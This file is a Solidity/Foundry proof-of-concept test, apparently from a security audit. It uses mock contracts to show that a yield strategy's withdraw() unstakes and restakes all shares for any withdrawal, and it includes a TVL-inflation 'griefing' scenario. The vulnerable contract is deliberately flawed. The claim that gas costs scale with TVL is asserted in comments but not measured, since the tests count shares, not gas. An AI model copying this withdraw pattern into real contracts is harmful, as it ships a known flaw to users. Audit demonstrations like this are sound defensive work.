// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * @title M-02 PoC: Withdraw Unstakes ALL Shares - Gas Griefing Vector
 * @notice STANDALONE POC - No external dependencies required
 *
 * @dev Vulnerability Location: AutoPoolYieldStrategy.sol#L264-L286
 *
 * VULNERABILITY SUMMARY:
 * The withdraw() function always unstakes ALL shares from mainRewarder, then re-stakes
 * the remaining shares after redeeming only the portion needed for the withdrawal.
 *
 * Vulnerable code pattern:
 *   function withdraw(...) {
 *       // Unstake ALL shares regardless of withdrawal size
 *       uint256 totalShares = mainRewarder.balanceOf(address(this));
 *       mainRewarder.withdraw(address(this), totalShares, false);  // UNSTAKES 100%
 *
 *       // Only redeem what's needed
 *       uint256 sharesToRedeem = autoPoolVault.convertToShares(amount);  // Tiny fraction
 *       autoPoolVault.redeem(sharesToRedeem, recipient, address(this));
 *
 *       // Re-stake ALL remaining shares
 *       uint256 leftoverShares = autoPoolVault.balanceOf(address(this));
 *       mainRewarder.stake(address(this), leftoverShares);  // RESTAKES 99.99%
 *   }
 *
 * IMPACT:
 * - Gas costs for ANY withdrawal scale with total TVL, not withdrawal size
 * - Withdrawing 1 token from a vault with 1M tokens costs same as full withdrawal
 * - As TVL grows, small withdrawals become increasingly gas-expensive
 * - Opens griefing vector: attacker makes large deposit, victim withdrawals expensive
 *
 * ATTACK PATH:
 * 1. Protocol has large TVL (e.g., 1,000,000 DOLA from multiple depositors)
 * 2. User wants to withdraw 1 DOLA
 * 3. withdraw() unstakes ALL 1,000,000 shares, processes 1 DOLA, re-stakes 999,999 shares
 * 4. Gas cost reflects processing 1M shares, not 1 DOLA
 */

// ============ INLINED MOCK CONTRACTS ============

/**
 * @notice Minimal ERC20 mock for testing
 */
contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

/**
 * @notice Mock ERC4626-like vault with 1:1 share ratio
 */
contract MockAutoPoolVault {
    MockERC20 public asset;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(address _asset) {
        asset = MockERC20(_asset);
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = assets; // 1:1 ratio for simplicity
        asset.transferFrom(msg.sender, address(this), assets);
        balanceOf[receiver] += shares;
        totalSupply += shares;
        return shares;
    }

    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
        assets = shares; // 1:1 ratio
        balanceOf[owner] -= shares;
        totalSupply -= shares;
        asset.transfer(receiver, assets);
        return assets;
    }

    function convertToShares(uint256 assets) external pure returns (uint256) {
        return assets; // 1:1 ratio
    }

    function convertToAssets(uint256 shares) external pure returns (uint256) {
        return shares; // 1:1 ratio
    }
}

/**
 * @notice Mock MainRewarder with tracking for PoC demonstration
 */
contract MockMainRewarder {
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;

    // ============ TRACKING FIELDS FOR POC ============
    uint256 public lastStakeAmount;
    uint256 public lastWithdrawAmount;
    uint256 public totalStakeCalls;
    uint256 public totalWithdrawCalls;
    uint256 public cumulativeSharesStaked;
    uint256 public cumulativeSharesWithdrawn;

    function stake(address user, uint256 amount) external {
        _balances[user] += amount;
        _totalSupply += amount;

        // Track for PoC
        lastStakeAmount = amount;
        totalStakeCalls++;
        cumulativeSharesStaked += amount;
    }

    function withdraw(address user, uint256 amount, bool /* claim */) external {
        require(_balances[user] >= amount, "Insufficient staked balance");
        _balances[user] -= amount;
        _totalSupply -= amount;

        // Track for PoC
        lastWithdrawAmount = amount;
        totalWithdrawCalls++;
        cumulativeSharesWithdrawn += amount;
    }

    function balanceOf(address user) external view returns (uint256) {
        return _balances[user];
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function resetTracking() external {
        lastStakeAmount = 0;
        lastWithdrawAmount = 0;
        totalStakeCalls = 0;
        totalWithdrawCalls = 0;
        cumulativeSharesStaked = 0;
        cumulativeSharesWithdrawn = 0;
    }
}

/**
 * @notice Simplified vulnerable yield strategy demonstrating the bug
 * @dev Replicates the vulnerable withdraw pattern from AutoPoolYieldStrategy.sol
 */
contract VulnerableYieldStrategy {
    MockERC20 public asset;
    MockAutoPoolVault public autoPoolVault;
    MockMainRewarder public mainRewarder;

    address public owner;
    mapping(address => bool) public isClient;
    mapping(address => uint256) public clientBalances;

    constructor(
        address _asset,
        address _autoPoolVault,
        address _mainRewarder
    ) {
        asset = MockERC20(_asset);
        autoPoolVault = MockAutoPoolVault(_autoPoolVault);
        mainRewarder = MockMainRewarder(_mainRewarder);
        owner = msg.sender;
    }

    function setClient(address client, bool status) external {
        require(msg.sender == owner, "Only owner");
        isClient[client] = status;
    }

    function deposit(uint256 amount, address depositor) external {
        require(isClient[msg.sender], "Not authorized");

        // Transfer asset from depositor
        asset.transferFrom(depositor, address(this), amount);

        // Deposit into vault
        asset.approve(address(autoPoolVault), amount);
        uint256 shares = autoPoolVault.deposit(amount, address(this));

        // Stake shares in mainRewarder
        mainRewarder.stake(address(this), shares);

        // Track client balance
        clientBalances[msg.sender] += amount;
    }

    /**
     * @notice VULNERABLE WITHDRAW FUNCTION
     * @dev This is the vulnerable pattern - unstakes ALL shares for ANY withdrawal
     */
    function withdraw(uint256 amount, address recipient) external {
        require(isClient[msg.sender], "Not authorized");
        require(clientBalances[msg.sender] >= amount, "Insufficient balance");

        // ============ VULNERABILITY: UNSTAKES ALL SHARES ============
        // Regardless of withdrawal size, we unstake EVERYTHING
        uint256 totalShares = mainRewarder.balanceOf(address(this));
        mainRewarder.withdraw(address(this), totalShares, false);  // UNSTAKES 100%!

        // Only redeem the shares we actually need
        uint256 sharesToRedeem = autoPoolVault.convertToShares(amount);  // Tiny fraction
        autoPoolVault.redeem(sharesToRedeem, recipient, address(this));

        // ============ VULNERABILITY: RE-STAKES ALL REMAINING ============
        // Re-stake ALL remaining shares back
        uint256 leftoverShares = autoPoolVault.balanceOf(address(this));
        if (leftoverShares > 0) {
            mainRewarder.stake(address(this), leftoverShares);  // RESTAKES 99.99%!
        }

        // Update client balance
        clientBalances[msg.sender] -= amount;
    }

    function balanceOf(address client) external view returns (uint256) {
        return clientBalances[client];
    }
}

// ============ TEST CONTRACT ============

contract M02PoCTest is Test {
    VulnerableYieldStrategy public strategy;
    MockERC20 public dolaToken;
    MockAutoPoolVault public autoPoolVault;
    MockMainRewarder public mainRewarder;

    address public owner = address(1);
    address public client = address(2);
    address public attacker = address(3);

    // Large deposit to demonstrate scaling
    uint256 public constant LARGE_DEPOSIT = 1_000_000e18;  // 1 million DOLA
    uint256 public constant TINY_WITHDRAWAL = 1e18;         // 1 DOLA

    function setUp() public {
        vm.startPrank(owner);

        // Deploy mock tokens and contracts
        dolaToken = new MockERC20("DOLA", "DOLA", 18);
        autoPoolVault = new MockAutoPoolVault(address(dolaToken));
        mainRewarder = new MockMainRewarder();

        // Deploy the vulnerable strategy
        strategy = new VulnerableYieldStrategy(
            address(dolaToken),
            address(autoPoolVault),
            address(mainRewarder)
        );

        // Setup client authorization
        strategy.setClient(client, true);

        vm.stopPrank();

        // Mint tokens for client and make deposit
        dolaToken.mint(client, LARGE_DEPOSIT);

        vm.startPrank(client);
        dolaToken.approve(address(strategy), type(uint256).max);
        strategy.deposit(LARGE_DEPOSIT, client);
        vm.stopPrank();

        // Verify initial state
        assertEq(strategy.balanceOf(client), LARGE_DEPOSIT);

        // Reset tracking after deposit
        mainRewarder.resetTracking();
    }

    /**
     * @notice Main PoC: Tiny withdrawal processes ALL shares
     * @dev Demonstrates that withdrawing 1 token unstakes/restakes 1M shares
     */
    function test_M02_TinyWithdrawalProcessesAllShares() public {
        console.log("=== M-02 PoC: Withdraw Unstakes ALL Shares ===");
        console.log("");

        // Initial state
        uint256 totalSharesStaked = mainRewarder.balanceOf(address(strategy));
        console.log("Step 1: Initial State");
        console.log("  - Total shares staked in mainRewarder:", totalSharesStaked / 1e18, "shares");
        console.log("  - Client wants to withdraw:", TINY_WITHDRAWAL / 1e18, "DOLA");
        console.log("  - Expected shares to process:", TINY_WITHDRAWAL / 1e18, "shares (1:1 ratio)");
        console.log("");

        // Execute tiny withdrawal
        console.log("Step 2: Execute withdrawal of 1 DOLA...");
        vm.prank(client);
        strategy.withdraw(TINY_WITHDRAWAL, client);

        // Analyze what happened
        uint256 sharesWithdrawn = mainRewarder.lastWithdrawAmount();
        uint256 sharesRestaked = mainRewarder.lastStakeAmount();

        console.log("");
        console.log("=== VULNERABILITY DEMONSTRATED ===");
        console.log("  - Shares UNSTAKED from mainRewarder:", sharesWithdrawn / 1e18);
        console.log("  - Shares RE-STAKED to mainRewarder:", sharesRestaked / 1e18);
        console.log("  - Actual DOLA withdrawn:", TINY_WITHDRAWAL / 1e18);
        console.log("");

        // The vulnerability: ALL shares were unstaked, not just needed amount
        assertEq(
            sharesWithdrawn,
            LARGE_DEPOSIT,  // All 1M shares unstaked
            "BUG: ALL shares were unstaked for a tiny withdrawal"
        );

        // Verify nearly all shares were re-staked
        uint256 sharesNeededForWithdrawal = autoPoolVault.convertToShares(TINY_WITHDRAWAL);
        uint256 expectedRestake = LARGE_DEPOSIT - sharesNeededForWithdrawal;

        assertEq(
            sharesRestaked,
            expectedRestake,
            "Nearly all shares were re-staked"
        );

        console.log("IMPACT:");
        console.log("  - Withdrawal of 1 DOLA processed", sharesWithdrawn / 1e18, "shares");
        console.log("  - That's", (sharesWithdrawn / TINY_WITHDRAWAL), "x more than necessary!");
        console.log("  - Gas costs scale with TVL, not withdrawal size");
        console.log("");
        console.log("=== VULNERABILITY CONFIRMED ===");
    }

    /**
     * @notice Shows the inefficient pattern: unstake all, process tiny amount, restake all
     * @dev Clearly demonstrates the wasteful share processing
     */
    function test_M02_InefficientPattern() public {
        console.log("=== M-02 PoC: Inefficient Unstake/Restake Pattern ===");
        console.log("");

        console.log("Vulnerable code pattern:");
        console.log("  1. mainRewarder.withdraw(address(this), totalShares, false);  // ALL shares");
        console.log("  2. autoPoolVault.redeem(sharesToRedeem, ...);  // Only needed amount");
        console.log("  3. mainRewarder.stake(address(this), leftoverShares);  // Nearly ALL shares");
        console.log("");

        // Track the actual operations
        vm.prank(client);
        strategy.withdraw(TINY_WITHDRAWAL, client);

        console.log("Actual operations for 1 DOLA withdrawal:");
        console.log("  1. Unstaked:", mainRewarder.lastWithdrawAmount() / 1e18, "shares (100% of TVL)");

        uint256 actuallyRedeemed = autoPoolVault.convertToShares(TINY_WITHDRAWAL);
        console.log("  2. Redeemed:", actuallyRedeemed / 1e18, "shares (0.0001% of TVL)");

        console.log("  3. Re-staked:", mainRewarder.lastStakeAmount() / 1e18, "shares (99.9999% of TVL)");
        console.log("");

        // Calculate efficiency
        uint256 necessaryShareOps = actuallyRedeemed;  // What we actually needed
        uint256 actualShareOps = mainRewarder.lastWithdrawAmount() + mainRewarder.lastStakeAmount();
        uint256 wasteRatio = actualShareOps / necessaryShareOps;

        console.log("=== INEFFICIENCY ANALYSIS ===");
        console.log("  - Necessary share operations:", necessaryShareOps / 1e18);
        console.log("  - Actual share operations:", actualShareOps / 1e18);
        console.log("  - Waste ratio:", wasteRatio, "x");
        console.log("");

        // Assert the inefficiency
        assertTrue(
            wasteRatio > 1000000,  // Over 1M times more operations than needed
            "Severely inefficient: millions of times more share ops than needed"
        );

        console.log("=== VULNERABILITY CONFIRMED ===");
        console.log("Each withdrawal does ~2M share operations regardless of amount");
        console.log("Efficient implementation would only touch shares being withdrawn");
    }

    /**
     * @notice Demonstrates griefing attack potential
     * @dev Attacker deposits to inflate TVL, making victim withdrawals process more shares
     */
    function test_M02_GriefingAttackVector() public {
        console.log("=== M-02 PoC: Griefing Attack Vector ===");
        console.log("");

        // Setup: Victim (client) already has 1M deposited
        console.log("Step 1: Initial State");
        console.log("  - Victim balance:", LARGE_DEPOSIT / 1e18, "DOLA");

        // Measure victim's withdrawal shares processed BEFORE attacker griefing
        vm.prank(client);
        strategy.withdraw(TINY_WITHDRAWAL, client);

        uint256 preAttackSharesProcessed = mainRewarder.lastWithdrawAmount() + mainRewarder.lastStakeAmount();
        console.log("  - Pre-attack shares processed:", preAttackSharesProcessed / 1e18);
        console.log("");

        // Attacker enters and deposits massive amount
        uint256 ATTACKER_DEPOSIT = 10_000_000e18;  // 10 million DOLA
        dolaToken.mint(attacker, ATTACKER_DEPOSIT);

        vm.prank(owner);
        strategy.setClient(attacker, true);

        vm.startPrank(attacker);
        dolaToken.approve(address(strategy), type(uint256).max);
        strategy.deposit(ATTACKER_DEPOSIT, attacker);
        vm.stopPrank();

        console.log("Step 2: Attacker griefs by depositing");
        console.log("  - Attacker deposits:", ATTACKER_DEPOSIT / 1e18, "DOLA");
        console.log("");

        // Measure victim's withdrawal shares processed AFTER attacker griefing
        mainRewarder.resetTracking();

        vm.prank(client);
        strategy.withdraw(TINY_WITHDRAWAL, client);

        uint256 postAttackSharesProcessed = mainRewarder.lastWithdrawAmount() + mainRewarder.lastStakeAmount();

        console.log("Step 3: Victim withdraws 1 DOLA after attack");
        console.log("  - Post-attack shares processed:", postAttackSharesProcessed / 1e18);
        console.log("");

        console.log("=== GRIEFING IMPACT ===");
        console.log("  - Shares processed increased by:",
            (postAttackSharesProcessed - preAttackSharesProcessed) / 1e18, "shares");
        console.log("  - Same 1 DOLA withdrawal now processes 10x more shares");
        console.log("");

        // Verify the griefing impact
        assertTrue(
            postAttackSharesProcessed > preAttackSharesProcessed * 5,
            "Attacker significantly increased victim's withdrawal processing"
        );

        console.log("=== VULNERABILITY CONFIRMED ===");
        console.log("Attacker can grief other users by inflating TVL");
        console.log("This increases share operations for all small withdrawals");
    }
}
